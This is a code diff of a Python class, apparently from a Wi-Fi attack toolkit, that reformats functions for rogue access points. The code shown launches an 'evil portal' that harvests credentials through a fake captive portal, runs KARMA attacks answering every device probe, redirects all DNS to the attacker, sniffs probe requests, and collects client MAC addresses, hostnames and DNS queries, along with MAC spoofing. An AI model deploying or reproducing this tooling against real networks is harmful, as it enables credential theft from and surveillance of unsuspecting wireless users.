@@ -72,9 +72,14 @@ class PineAP:
 
     # ── Evil Portal ─────────────────────────────────────────────
 
-    def start_evil_portal(self, interface: str, ssid: str, channel: int = 6,
-                          portal: str = "wifi_login",
-                          internet_iface: str = "eth0") -> dict:
+    def start_evil_portal(
+        self,
+        interface: str,
+        ssid: str,
+        channel: int = 6,
+        portal: str = "wifi_login",
+        internet_iface: str = "eth0",
+    ) -> dict:
         """Launch rogue AP with captive portal credential harvesting."""
         portal_path = PORTALS_DIR / f"{portal}.html"
         if not portal_path.exists():
@@ -123,27 +128,37 @@ address=/#/10.0.0.1
             self.layer.run(cmd, sudo=True, timeout=5)
 
         # 4. Launch hostapd + dnsmasq
-        h = self.layer.run_background("hostapd /tmp/james_hostapd.conf", sudo=True)
+        h = self.layer.run_background(
+            "hostapd /tmp/james_hostapd.conf", sudo=True
+        )
         self._procs.append(h)
         time.sleep(2)
-        d = self.layer.run_background("dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True)
+        d = self.layer.run_background(
+            "dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True
+        )
         self._procs.append(d)
         time.sleep(1)
 
         # 5. Start captive portal HTTP server
         self._http_server = HTTPServer(("0.0.0.0", 8080), _CaptiveHandler)
-        self._http_thread = threading.Thread(target=self._http_server.serve_forever, daemon=True)
+        self._http_thread = threading.Thread(
+            target=self._http_server.serve_forever, daemon=True
+        )
         self._http_thread.start()
 
         return {
-            "status": "active", "ssid": ssid, "portal": portal,
-            "gateway": "10.0.0.1", "creds_log": str(CREDS_LOG),
+            "status": "active",
+            "ssid": ssid,
+            "portal": portal,
+            "gateway": "10.0.0.1",
+            "creds_log": str(CREDS_LOG),
         }
 
     # ── KARMA Attack ────────────────────────────────────────────
 
-    def start_karma(self, interface: str, channel: int = 6,
-                    internet_iface: str = "eth0") -> dict:
+    def start_karma(
+        self, interface: str, channel: int = 6, internet_iface: str = "eth0"
+    ) -> dict:
         """KARMA mode: respond to ALL probe requests with matching SSID.
 
         Uses hostapd-mana or hostapd with karma patch if available,
@@ -162,7 +177,9 @@ enable_karma=1
 karma_loud=1
 """
             Path("/tmp/james_karma.conf").write_text(conf)
-            proc = self.layer.run_background("hostapd-mana /tmp/james_karma.conf", sudo=True)
+            proc = self.layer.run_background(
+                "hostapd-mana /tmp/james_karma.conf", sudo=True
+            )
             self._procs.append(proc)
         else:
             # Fallback: harvest probes and create matching APs
@@ -176,12 +193,20 @@ macaddr_acl=0
 auth_algs=1
 """
             Path("/tmp/james_karma.conf").write_text(conf)
-            proc = self.layer.run_background("hostapd /tmp/james_karma.conf", sudo=True)
+            proc = self.layer.run_background(
+                "hostapd /tmp/james_karma.conf", sudo=True
+            )
             self._procs.append(proc)
 
         # Setup network
-        self.layer.run(f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0", sudo=True, timeout=5)
-        self.layer.run("echo 1 > /proc/sys/net/ipv4/ip_forward", sudo=True, timeout=5)
+        self.layer.run(
+            f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0",
+            sudo=True,
+            timeout=5,
+        )
+        self.layer.run(
+            "echo 1 > /proc/sys/net/ipv4/ip_forward", sudo=True, timeout=5
+        )
 
         dnsmasq_conf = f"""interface={interface}
 dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
@@ -193,7 +218,9 @@ log-facility=/tmp/james_dns.log
 listen-address=10.0.0.1
 """
         Path("/tmp/james_dnsmasq.conf").write_text(dnsmasq_conf)
-        d = self.layer.run_background("dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True)
+        d = self.layer.run_background(
+            "dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True
+        )
         self._procs.append(d)
 
         return {"status": "active", "mode": "karma", "mana": has_mana}
@@ -205,21 +232,28 @@ listen-address=10.0.0.1
         result = self.layer.run(
             f"timeout {duration} tcpdump -i {interface} -e -s 256 "
             f"'subtype probe-req' -l 2>/dev/null",
-            sudo=True, timeout=duration + 10
+            sudo=True,
+            timeout=duration + 10,
         )
         probes = []
         seen = set()
         for line in result.stdout.splitlines():
             # Extract MAC and SSID from probe requests
-            mac_match = re.search(r'SA:([0-9a-fA-F:]{17})', line)
-            ssid_match = re.search(r'Probe Request \(([^)]+)\)', line)
+            mac_match = re.search(r"SA:([0-9a-fA-F:]{17})", line)
+            ssid_match = re.search(r"Probe Request \(([^)]+)\)", line)
             if mac_match:
                 mac = mac_match.group(1)
                 ssid = ssid_match.group(1) if ssid_match else "(broadcast)"
                 key = f"{mac}:{ssid}"
                 if key not in seen:
                     seen.add(key)
-                    probes.append({"mac": mac, "ssid": ssid, "time": datetime.now().isoformat()})
+                    probes.append(
+                        {
+                            "mac": mac,
+                            "ssid": ssid,
+                            "time": datetime.now().isoformat(),
+                        }
+                    )
 
         # Also try tshark if tcpdump didn't get much
         if len(probes) < 3:
@@ -227,17 +261,24 @@ listen-address=10.0.0.1
                 f"timeout {duration} tshark -i {interface} "
                 f"-Y 'wlan.fc.type_subtype == 0x04' "
                 f"-T fields -e wlan.sa -e wlan_mgt.ssid 2>/dev/null",
-                sudo=True, timeout=duration + 10
+                sudo=True,
+                timeout=duration + 10,
             )
             for line in tshark.stdout.splitlines():
-                parts = line.strip().split('\t')
+                parts = line.strip().split("\t")
                 if parts:
                     mac = parts[0] if parts else ""
                     ssid = parts[1] if len(parts) > 1 else "(broadcast)"
                     key = f"{mac}:{ssid}"
                     if key not in seen:
                         seen.add(key)
-                        probes.append({"mac": mac, "ssid": ssid, "time": datetime.now().isoformat()})
+                        probes.append(
+                            {
+                                "mac": mac,
+                                "ssid": ssid,
+                                "time": datetime.now().isoformat(),
+                            }
+                        )
 
         # Save probes
         PROBES_LOG.parent.mkdir(parents=True, exist_ok=True)
@@ -254,27 +295,45 @@ listen-address=10.0.0.1
         # ARP table
         arp = self.layer.run("arp -a 2>/dev/null", timeout=5)
         for line in arp.stdout.splitlines():
-            m = re.match(r'(\S+)\s+\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-fA-F:]+)', line)
+            m = re.match(
+                r"(\S+)\s+\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-fA-F:]+)",
+                line,
+            )
             if m and m.group(2).startswith("10.0.0."):
-                clients.append({
-                    "hostname": m.group(1), "ip": m.group(2),
-                    "mac": m.group(3), "source": "arp"
-                })
+                clients.append(
+                    {
+                        "hostname": m.group(1),
+                        "ip": m.group(2),
+                        "mac": m.group(3),
+                        "source": "arp",
+                    }
+                )
 
         # DHCP leases
-        for lease_file in ["/var/lib/misc/dnsmasq.leases", "/tmp/dnsmasq.leases"]:
-            self.layer.run(f"chmod 644 {lease_file} 2>/dev/null", sudo=True, timeout=2)
+        for lease_file in [
+            "/var/lib/misc/dnsmasq.leases",
+            "/tmp/dnsmasq.leases",
+        ]:
+            self.layer.run(
+                f"chmod 644 {lease_file} 2>/dev/null", sudo=True, timeout=2
+            )
             if os.path.exists(lease_file):
                 try:
                     for line in open(lease_file):
                         parts = line.strip().split()
                         if len(parts) >= 4:
-                            clients.append({
-                                "mac": parts[1], "ip": parts[2],
-                                "hostname": parts[3], "source": "dhcp"
-                            })
+                            clients.append(
+                                {
+                                    "mac": parts[1],
+                                    "ip": parts[2],
+                                    "hostname": parts[3],
+                                    "source": "dhcp",
+                                }
+                            )
                 except Exception as e:
-                    logger.debug("Failed to read DHCP leases %s: %s", lease_file, e)
+                    logger.debug(
+                        "Failed to read DHCP leases %s: %s", lease_file, e
+                    )
 
         # Dedupe by MAC
         seen = {}
@@ -289,17 +348,24 @@ listen-address=10.0.0.1
         log_path = "/tmp/james_dns.log"
         queries = []
         # Ensure the file is readable by our user (dnsmasq creates it as root)
-        self.layer.run(f"chmod 644 {log_path} 2>/dev/null", sudo=True, timeout=2)
-        
+        self.layer.run(
+            f"chmod 644 {log_path} 2>/dev/null", sudo=True, timeout=2
+        )
+
         if os.path.exists(log_path):
             try:
                 for line in open(log_path):
-                    m = re.search(r'query\[(\w+)\]\s+(\S+)\s+from\s+(\S+)', line)
+                    m = re.search(
+                        r"query\[(\w+)\]\s+(\S+)\s+from\s+(\S+)", line
+                    )
                     if m:
-                        queries.append({
-                            "type": m.group(1), "domain": m.group(2),
-                            "client": m.group(3)
-                        })
+                        queries.append(
+                            {
+                                "type": m.group(1),
+                                "domain": m.group(2),
+                                "client": m.group(3),
+                            }
+                        )
             except Exception as e:
                 logger.debug("Failed to read DNS log: %s", e)
         return {"count": len(queries), "queries": queries[-limit:]}
@@ -310,12 +376,16 @@ listen-address=10.0.0.1
         """Randomize or set specific MAC address using macchanger."""
         self.layer.run(f"ip link set {interface} down", sudo=True, timeout=5)
         if mac:
-            result = self.layer.run(f"macchanger -m {mac} {interface}", sudo=True, timeout=5)
+            result = self.layer.run(
+                f"macchanger -m {mac} {interface}", sudo=True, timeout=5
+            )
         else:
-            result = self.layer.run(f"macchanger -r {interface}", sudo=True, timeout=5)
+            result = self.layer.run(
+                f"macchanger -r {interface}", sudo=True, timeout=5
+            )
         self.layer.run(f"ip link set {interface} up", sudo=True, timeout=5)
 
-        new_mac_match = re.search(r'New MAC:\s+([0-9a-fA-F:]+)', result.stdout)
+        new_mac_match = re.search(r"New MAC:\s+([0-9a-fA-F:]+)", result.stdout)
         new_mac = new_mac_match.group(1) if new_mac_match else "unknown"
         return {"success": result.returncode == 0, "new_mac": new_mac}
 
@@ -333,11 +403,15 @@ listen-address=10.0.0.1
 
     # ── Combined KARMA + Portal ─────────────────────────────────
 
-    def start_karma_with_portal(self, interface: str, channel: int = 6,
-                                 ssid: str = "Free_WiFi",
-                                 portal: str = "wifi_login",
-                                 internet_iface: str = "eth0",
-                                 bssid: str = None) -> dict:
+    def start_karma_with_portal(
+        self,
+        interface: str,
+        channel: int = 6,
+        ssid: str = "Free_WiFi",
+        portal: str = "wifi_login",
+        internet_iface: str = "eth0",
+        bssid: str = None,
+    ) -> dict:
         """Launch KARMA mode combined with an Evil Portal.
 
         1. hostapd-mana (KARMA) or hostapd fallback — respond to ALL probes
@@ -358,7 +432,7 @@ listen-address=10.0.0.1
             )
 
         has_mana = shutil.which("hostapd-mana") is not None
-        
+
         bssid_line = f"bssid={bssid}" if bssid else ""
 
         if has_mana:
@@ -384,7 +458,9 @@ auth_algs=1
 """
         Path("/tmp/james_karma.conf").write_text(conf)
         hostapd_bin = "hostapd-mana" if has_mana else "hostapd"
-        proc = self.layer.run_background(f"{hostapd_bin} /tmp/james_karma.conf", sudo=True)
+        proc = self.layer.run_background(
+            f"{hostapd_bin} /tmp/james_karma.conf", sudo=True
+        )
         self._procs.append(proc)
 
         # Network setup
@@ -413,7 +489,9 @@ listen-address=10.0.0.1
 address=/#/10.0.0.1
 """
         Path("/tmp/james_dnsmasq.conf").write_text(dnsmasq_conf)
-        d = self.layer.run_background("dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True)
+        d = self.layer.run_background(
+            "dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True
+        )
         self._procs.append(d)
         time.sleep(1)
 
@@ -424,12 +502,18 @@ address=/#/10.0.0.1
         except Exception as e:
             logger.debug("HTTP server shutdown during restart: %s", e)
         self._http_server = HTTPServer(("0.0.0.0", 8080), _CaptiveHandler)
-        self._http_thread = threading.Thread(target=self._http_server.serve_forever, daemon=True)
+        self._http_thread = threading.Thread(
+            target=self._http_server.serve_forever, daemon=True
+        )
         self._http_thread.start()
 
         return {
-            "status": "active", "mode": "karma+portal", "mana": has_mana,
-            "ssid": ssid, "portal": portal, "gateway": "10.0.0.1",
+            "status": "active",
+            "mode": "karma+portal",
+            "mana": has_mana,
+            "ssid": ssid,
+            "portal": portal,
+            "gateway": "10.0.0.1",
             "creds_log": str(CREDS_LOG),
         }
 
@@ -464,18 +548,34 @@ address=/#/10.0.0.1
                 proc.terminate()
                 proc.wait(timeout=3)
             except Exception as e:
-                logger.debug("Graceful terminate failed (PID %s): %s — force killing", proc.pid, e)
+                logger.debug(
+                    "Graceful terminate failed (PID %s): %s — force killing",
+                    proc.pid,
+                    e,
+                )
                 try:
                     proc.kill()
                 except Exception as e2:
-                    logger.warning("Force kill failed (PID %s): %s", proc.pid, e2)
+                    logger.warning(
+                        "Force kill failed (PID %s): %s", proc.pid, e2
+                    )
         self._procs.clear()
 
         # Kill any lingering hostapd/dnsmasq
-        self.layer.run("killall hostapd dnsmasq hostapd-mana 2>/dev/null", sudo=True, timeout=5)
+        self.layer.run(
+            "killall hostapd dnsmasq hostapd-mana 2>/dev/null",
+            sudo=True,
+            timeout=5,
+        )
 
         # Flush iptables
-        self.layer.run("iptables --flush && iptables --table nat --flush", sudo=True, timeout=5)
-        self.layer.run("echo 0 > /proc/sys/net/ipv4/ip_forward", sudo=True, timeout=5)
+        self.layer.run(
+            "iptables --flush && iptables --table nat --flush",
+            sudo=True,
+            timeout=5,
+        )
+        self.layer.run(
+            "echo 0 > /proc/sys/net/ipv4/ip_forward", sudo=True, timeout=5
+        )
 
         return {"status": "stopped"}
